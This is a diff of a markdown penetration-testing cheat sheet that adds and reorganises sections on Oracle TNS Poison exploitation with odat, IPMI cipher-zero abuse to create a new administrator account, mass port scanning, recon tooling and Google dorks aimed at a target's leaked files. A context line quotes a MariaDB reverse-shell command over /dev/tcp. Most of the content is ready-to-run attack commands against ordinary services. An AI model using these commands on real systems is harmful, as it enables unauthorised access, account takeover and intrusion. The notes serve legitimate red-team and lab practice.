@@ -1456,25 +1456,12 @@ MariaDB> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 
 
 
 
-### TNS Poison
-
-* [http://www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
-* [https://www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)
-
-
-#### Nmap
-
-```
-$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
-$ sudo nmap -v -n -Pn -sV --script oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
-```
-
-
-#### odat
-
-Install manually:
+### odat
 
 * [https://github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
+
+Install manually (depreciated):
+
 * [https://github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
 
 ```
@@ -1495,13 +1482,39 @@ $ pip3 install cx_Oracle
 $ python3 odat.py -h
 ```
 
-Usage:
+
+
+### TNS Poison
+
+* [http://www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
+* [https://www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)
+
+Check with Nmap:
+
+```
+$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
+$ sudo nmap -v -n -Pn -sV --script oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
+```
+
+Brute SID with MSF:
+
+```
+msf > use use auxiliary/scanner/oracle/sid_brute
+```
+
+Brute SID with odat:
+
+```
+$ odat sidguesser -s 10.10.13.37 -p 1521
+```
+
+Exploit with odat:
 
 * [https://github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
 
 ```
-$ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --test-module
-$ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --poison
+$ odat tnspoison -s 10.10.13.37 -d <SID> --test-module
+$ odat tnspoison -s 10.10.13.37 -d <SID> --poison
 ```
 
 
@@ -2418,7 +2431,7 @@ $ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=',
 Fast port discovery with Masscan + versions and scripts with Nmap:
 
 ```
-$ sudo masscan --rate 3000 -e tun0 -p1-65535,U:0-65535 127.0.0.1 > masscan/ports
+$ sudo masscan --rate 1000 -e tun0 -p1-65535,U:0-65535 127.0.0.1 > masscan/ports
 $ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 ```
@@ -2426,7 +2439,7 @@ $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
 
 ```
-$ sudo nmap -n -Pn --min-rate 3000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
+$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
 $ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
 
@@ -2499,6 +2512,12 @@ Top TCP ports:
 | 27017                                        | MongoDB                          |
 | 45000,45001                                  | JDWP                             |
 
+TCP one-liner:
+
+```
+ports_tcp="21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,623,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500"
+```
+
 Top UDP ports:
 
 | Port |  Service   |
@@ -2514,22 +2533,44 @@ Top UDP ports:
 |  623 | IPMI       |
 | 3391 | RD Gateway |
 
+UDP one-liner:
+
+```
+ports_udp="53,67,69,88,123,137,161,500,623,3391"
+```
+
+##### Masscan
+
 * [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)
+
+```
+$ sudo masscan [-e eth0] --rate 1000 -iL hosts.txt --open -p$ports --resume paused.conf >> masscan.out
+$ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
+```
+
+##### RustScan
+
 * [https://github.com/RustScan/RustScan/wiki/Usage](https://github.com/RustScan/RustScan/wiki/Usage)
+
+```
+$ sudo rustscan -b 1000 -t 2000 -u 5000 -a hosts.txt -r $ports -g --no-config --scan-order "Random" > rustscan.out
+```
+
+Scan Nmap top 1000 TCP ports:
+
+* [https://github.com/RustScan/RustScan/wiki/Config-File](https://github.com/RustScan/RustScan/wiki/Config-File)
+
+```
+$ sudo wget https://gist.github.com/snovvcrash/c7f8223cc27154555496a9cbb4650681/raw/a76a2c658370d8b823a8a38a860e4d88051b417e/rustscan-ports-top1000.toml -O /root/.rustscan.toml
+$ sudo rustscan -a 10.10.13.37 --top
+```
+
+##### Naabu
+
 * [https://github.com/projectdiscovery/naabu/releases](https://github.com/projectdiscovery/naabu/releases)
 
 ```
-$ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,623,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
-
- # Masscan
-$ sudo masscan [-e eth0] --rate 3000 -iL hosts.txt --open -p$ports --resume paused.conf >> masscan.out
-$ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
-
- # RustScan
-$ sudo rustscan -b 3000 -u 5000 -a hosts.txt -r $ports -g --no-config --scan-order "Random" > rustscan.out
-
- # Naabu
-$ sudo ./naabu [-interface eth0] -iL hosts.txt -rate 3000 -p - -silent -nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest'
+$ sudo naabu [-interface eth0] -iL hosts.txt -rate 1000 -p - -silent -nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest'
 ```
 
 ##### Nmap
@@ -2537,7 +2578,16 @@ $ sudo ./naabu [-interface eth0] -iL hosts.txt -rate 3000 -p - -silent -nmap-cli
 Flag `-A`:
 
 ```
-$ nmap -A ... == nmap -sC -sV -O --traceroute ...
+nmap -A ... == nmap -sC -sV -O --traceroute ...
+```
+
+Host discovery flag:
+
+```
+nmap -sn ... == nmap -PS443 -PA80 -PE -PP ...
+-PS/PA/PU/PY [portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
+-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+-PO [protocol list]: IP protocol ping
 ```
 
 
@@ -3486,10 +3536,11 @@ $ sudo pkill atftpd
 ## Google Dorks
 
 ```
-site:example.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
-site:example.com ext:(config | cfg | ini | log | bak | backup | dat)
-site:example.com ext:(php | asp | aspx)
-"@example.com" email e-mail
+site:megacorp.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
+site:megacorp.com ext:(config | cfg | ini | log | bak | backup | dat)
+site:megacorp.com ext:(php | asp | aspx)
+"@megacorp.com" email e-mail
+"megacorp.com" site:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com
 ```
 
 
@@ -3534,20 +3585,20 @@ Discover with MSF:
 msf > use scanner/ipmi/ipmi/ipmi_cipher_zero
 ```
 
-Guess existing admin username. If `Administrator` username is correct, the `list` command will succeed (password doesn't matter):
+Guess existing admin username. If `ADMIN` username is correct, the `list` command will succeed (password doesn't matter):
 
 ```
 $ sudo apt install ipmitool
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user list
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user list
 ```
 
 Add new admin user (only existing admin username is needed):
 
 ```
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user set name <ID> snovvcrash
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user set password <ID> 'Passw0rd!'
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user priv <ID> 4
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user enable <ID> 3
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set name <ID> snovvcrash
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set password <ID> 'Passw0rd!'
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user priv <ID> 4
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user enable <ID> 3
 ```
 
 
@@ -4516,7 +4567,7 @@ $ ./hashcat64.exe -m 1000 -b
 
 
 
-### via IP
+### Info via IP
 
 dig:
 
@@ -4533,7 +4584,7 @@ $ whois -h whois.radb.net 127.0.0.1
 
 
 
-### via ASN
+### Info via ASN
 
 whois:
 
@@ -4541,6 +4592,30 @@ whois:
 $ whois -h whois.cymru.com -- '-v AS48666'
 $ whois -h whois.radb.net AS48666
 ```
+
+
+
+### Search AS
+
+* [https://radar.qrator.net/search?query=AS31337](https://radar.qrator.net/search?query=AS31337)
+* [https://github.com/nitefood/asn](https://github.com/nitefood/asn)
+
+Map IP addresses to AS by origin and netname with ignoring potentionally unwanted netname values by keywords:
+
+```bash
+#!/bin/bash
+# Usage: whois.sh ip_list.txt
+
+for ip in `cat $1`; do
+  ASNUM=`whois $ip | grep -i "origin:" | tr -d ' ' | cut -d ":" -f 2 | tr $'\n' ','`
+  NETNAME=`whois $ip | grep -i "netname:" | tr -d ' ' | cut -d ":" -f 2`
+  if ! echo "$NETNAME" | grep -iqF -e pppoe -e ipoe; then
+    echo "$ASNUM,$NETNAME,$ip"
+   fi
+done
+```
+
+Difference between as-name, aut-num, origin, netname, etc. may be found on [RIPE](https://www.ripe.net/manage-ips-and-asns/db/support/documentation/ripe-database-documentation/@@fullbodyrecursive-view).
 
 
 
@@ -7653,9 +7728,8 @@ GitHub:
 * [https://github.com/OJ/gobuster/releases](https://github.com/OJ/gobuster/releases)
 
 ```
-$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
-
-$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words[-lowercase].txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ gobuster dir -ku 'https://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ gobuster dir -ku 'https://127.0.0.1' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words[-lowercase].txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 ```
 
 
@@ -7700,8 +7774,8 @@ $ cat nmap/tcp.xml | ./aquatone -out 10.0-255.0-255.0-255_nmap
 * [https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html](https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html)
 
 ```
-$ amass intel -active -config config.ini -whois -df domains.txt -ipv4 -src -v -o intel.txt
-$ amass enum -active -brute -config config.ini -df domains.txt -ipv4 -src -v -o enum.txt
+$ amass intel -active -config config.ini -whois -df domains.txt -ipv4 -src -v -o intel.out
+$ amass enum -active -brute -config config.ini -df domains.txt -ipv4 -src -v -o enum.out
 ```
 
 
@@ -7722,6 +7796,38 @@ $ subfinder -all -config config.yaml -d hackerone.com -o subdomains.txt [-oI -nW
 
 ```
 $ shuffledns -d hackerone.com -r /opt/dnsvalidator/resolvers.txt -w /usr/share/commonspeak2-wordlists/subdomains/subdomains.txt -o subdomains.txt -t 500
+```
+
+
+
+### MassDNS
+
+* [https://github.com/blechschmidt/massdns](https://github.com/blechschmidt/massdns)
+* [https://github.com/vortexau/dnsvalidator](https://github.com/vortexau/dnsvalidator)
+
+```
+$ massdns -r /opt/dnsvalidator/resolvers.txt domains.txt -w domains-resolved.txt -o S
+```
+
+
+
+### nuclei
+
+* [https://github.com/projectdiscovery/nuclei/releases](https://github.com/projectdiscovery/nuclei/releases)
+
+```
+$ nuclei -update-templates
+$ nuclei -l domains.txt -t cves/ -o nuclei.out
+```
+
+
+
+### httpx
+
+* [https://github.com/projectdiscovery/httpx/releases](https://github.com/projectdiscovery/httpx/releases)
+
+```
+$ httpx -l domains.txt -vhost -http2 -pipeline -title -content-length -status-code -follow-redirects -tls-probe -content-type -location -csp-probe -web-server -stats -ip -cname -cdn -ports 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017 -threads 300 -o httpx.out
 ```
 
 
